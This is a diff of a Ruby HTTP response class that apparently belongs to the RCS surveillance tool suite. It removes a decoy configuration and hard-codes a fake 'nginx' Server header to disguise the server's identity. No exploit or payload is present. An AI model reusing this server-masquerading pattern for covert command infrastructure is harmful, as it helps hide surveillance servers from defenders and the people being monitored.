@@ -3,7 +3,6 @@
 #
 
 require_relative 'em_streamer'
-require_relative '../../config/decoy'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -42,7 +41,7 @@ class RESTResponse
     @response = EM::DelegatedHttpResponse.new @connection
 
     @response.status = @status
-    @response.status_string = ::Net::HTTPResponse::CODE_TO_OBJ["#{@response.status}"].name.gsub(/Net::HTTP/, '')
+    @response.status_string = ::Net::HTTPResponse::CODE_TO_OBJ["#{@response.status}"].name.gsub(/Net::HTTP/, '') unless @response.status.eql? 444
 
     begin
       @response.content = (@content_type == 'application/json') ? @content.to_json : @content
@@ -53,13 +52,11 @@ class RESTResponse
       trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
     end
 
-    expiry = (Time.now() + 86400).strftime('%A, %d-%b-%y %H:%M:%S %Z')
-
     @response.headers['Content-Type'] = @content_type
     @response.headers['Set-Cookie'] = "ID=" + @cookie unless @cookie.nil?
 
     # fake server reply
-    @response.headers['Server'] = FakeServer::SERVER_STRING
+    @response.headers['Server'] = 'nginx'
 
     # date header
     @response.headers['Date'] = Time.now.getutc.strftime("%a, %d %b %Y %H:%M:%S %Z")
@@ -75,9 +72,6 @@ class RESTResponse
     else
       @response.headers['Connection'] = 'close'
     end
-
-    # force close on errors
-    @response.headers['Connection'] = 'close' unless @status.eql? 200
 
     self
   end
